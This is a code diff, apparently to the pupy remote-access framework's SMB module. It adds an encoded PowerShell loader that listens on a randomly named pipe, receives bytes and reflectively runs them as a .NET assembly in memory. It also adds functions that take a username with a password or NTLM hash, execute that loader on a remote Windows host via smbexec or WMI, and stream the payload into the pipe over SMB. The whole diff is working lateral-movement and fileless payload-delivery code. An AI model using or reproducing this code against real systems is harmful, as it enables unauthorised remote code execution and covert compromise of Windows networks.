@@ -16,6 +16,9 @@ except ImportError:
 import encodings
 
 from StringIO import StringIO
+from base64 import b64encode
+from hashlib import md5
+from threading import Thread
 
 from impacket.dcerpc.v5 import transport, scmr
 from impacket.dcerpc.v5.dcomrt import DCOMConnection
@@ -25,6 +28,7 @@ from impacket.system_errors import \
      ERROR_SERVICE_DOES_NOT_EXIST, ERROR_SERVICE_NOT_ACTIVE, \
      ERROR_SERVICE_REQUEST_TIMEOUT
 from impacket.smbconnection import SMBConnection, SessionError, SMB_DIALECT
+from impacket.smb3structs import FILE_WRITE_DATA, FILE_APPEND_DATA
 
 from sys import getdefaultencoding
 
@@ -45,6 +49,21 @@ try:
     SUCCESS_CACHE = pupy.creds_cache['psexec']
 except ImportError:
     pass
+
+# Use Start-Transcript -Path C:\windows\temp\d.log -Force; to debug
+
+PIPE_LOADER_TEMPLATE = '''
+$ps=new-object System.IO.Pipes.PipeSecurity;
+$p=new-object System.IO.Pipes.NamedPipeServerStream("{pipename}","In",2,"Byte",0,{size},0);
+$p.WaitForConnection();
+$x=new-object System.IO.BinaryReader($p);
+$a=$x.ReadBytes({size});
+$x.Close();
+[Reflection.Assembly]::Load($a).GetTypes()[0].GetMethods()[0].Invoke($null,@());
+'''
+
+PIPE_LOADER_CMD_TEMPLATE = '{powershell} -EncodedCommand {cmd}'
+POWERSHELL_PATH = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
 
 PERM_DIR       = ''.join(random.sample(string.ascii_letters, 10))
 BATCH_FILENAME = ''.join(random.sample(string.ascii_letters, 10)) + '.bat'
@@ -67,6 +86,12 @@ if 'idna' not in encodings._cache or not encodings._cache['idna']:
 
     encodings._cache['idna'] = encodings.idna.getregentry()
 
+def generate_loader_cmd(size):
+    pipename = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in xrange(10))
+    encoded = b64encode(PIPE_LOADER_TEMPLATE.format(
+        pipename=pipename, size=size).encode('utf-16le'))
+    cmd = PIPE_LOADER_CMD_TEMPLATE.format(powershell=POWERSHELL_PATH, cmd=encoded)
+    return cmd, pipename
 
 def create_filetransfer(*args, **kwargs):
     smbc, error = ConnectionInfo(*args, **kwargs).create_connection()
@@ -246,6 +271,10 @@ class FileTransfer(object):
     def ok(self):
         return self._exception is None
 
+    @property
+    def info(self):
+        return self._conn.getServerOS()
+
     def shares(self):
         self._exception = None
 
@@ -349,9 +378,41 @@ class FileTransfer(object):
         except Exception, e:
             self._exception = e
 
+    def push_to_pipe(self, pipe, data, timeout=90):
+        tid = self._conn.connectTree('IPC$')
+        pipeReady = False
+
+        for _ in xrange(timeout):
+            try:
+                self._conn.waitNamedPipe(tid, '\\' + pipe)
+                pipeReady = True
+                break
+
+            except:
+                time.sleep(1)
+                pass
+
+        if not pipeReady:
+            raise Exception('Couldn\'t connect to pipe {}'.format(pipe))
+
+        fid = self._conn.openFile(
+            tid, pipe, FILE_WRITE_DATA | FILE_APPEND_DATA, shareMode=0)
+
+        try:
+            # Write by small chunks (1.4 KB)
+            # Slow, but should work with crappy networks
+            for offset in xrange(0, len(data), 1400):
+                self._conn.writeNamedPipe(
+                    tid, fid,
+                    data[offset:offset+1400]
+                )
+        finally:
+            self._conn.closeFile(tid, fid)
+
     def close(self):
-        self._conn.logoff()
-        self._conn.close()
+        if self._conn:
+            self._conn.logoff()
+            self._conn.close()
 
 class ShellServiceAlreadyExists(Exception):
     pass
@@ -566,17 +627,21 @@ def smbexec(
         user, domain,
         password, ntlm,
         command, share='C$', execm='smbexec',
-        codepage=None, timeout=30, output=True):
+        codepage=None, timeout=30, output=True, on_exec=None):
 
     conninfo = ConnectionInfo(
         host, port, user, domain, password, ntlm, timeout=timeout
     )
 
-    try:
-        filename = None
+    filename = None
+    ft = None
+    smbc = None
 
+    try:
         if execm == 'smbexec':
             smbc, filename = sc(conninfo, command, output, timeout if output else None)
+            if not smbc:
+                return None, filename
 
         elif execm == 'wmi':
             if output:
@@ -595,8 +660,20 @@ def smbexec(
 
             filename = wmiexec(conninfo, command, share, output)
 
+        if on_exec:
+            if not smbc:
+                smbc, error = conninfo.create_connection()
+                if not smbc:
+                    return None, error
+
+            if smbc:
+                ft = FileTransfer(smbc)
+                on_exec(ft)
+
         if filename:
-            ft = FileTransfer(smbc)
+            if not ft:
+                ft = FileTransfer(smbc)
+
             buf = StringIO()
             for retry in xrange(5):
                 ft.get(share, filename, buf.write)
@@ -626,3 +703,66 @@ def smbexec(
     except Exception as e:
         return None, '{}:{} {}: {}\n{}'.format(
             host, port, type(e).__name__, e, traceback.format_exc())
+
+    finally:
+        if ft:
+            ft.close()
+
+def pupy_smb_exec(
+    host, port,
+    user, domain,
+    password, ntlm,
+    payload,
+    execm='smbexec',
+    timeout=90, log_cb=None):
+
+    size = len(payload)
+    cmd, pipename = generate_loader_cmd(size)
+
+    def _loader():
+        if log_cb:
+            log_cb(None, 'Thread started (pipe={}, payload={}, md5={})'.format(
+                pipename, size, md5(payload).hexdigest()))
+
+        def _push_payload(ft):
+            if log_cb:
+                log_cb(None, 'Connected to {}:{} (user={}, os={})'.format(
+                    host, port, ((domain + '\\') if domain else '') + user,
+                    ft.info))
+
+            try:
+                ft.push_to_pipe(pipename, payload, timeout=timeout)
+                if log_cb:
+                    log_cb(True, 'Payload flushed')
+
+            except Exception, e:
+                if log_cb:
+                    log_cb(False, '{}: {}'.format(
+                        e, traceback.format_exc()))
+
+        try:
+            _, error = smbexec(
+                host, port,
+                user, domain,
+                password, ntlm,
+                cmd, execm=execm,
+                timeout=timeout,
+                output=False,
+                on_exec=_push_payload)
+
+            if log_cb and error:
+                log_cb(False, 'Smbexec failed: {})'.format(error))
+
+        except Exception, e:
+            if log_cb:
+                log_cb(False, 'Communication failed: {})'.format(e))
+
+    worker = Thread(
+        target=_loader,
+        name='PowerLoader [smb] (pipe={}, timeout={})'.format(
+            pipename, timeout)
+    )
+    worker.daemon = True
+    worker.start()
+
+    return cmd, pipename
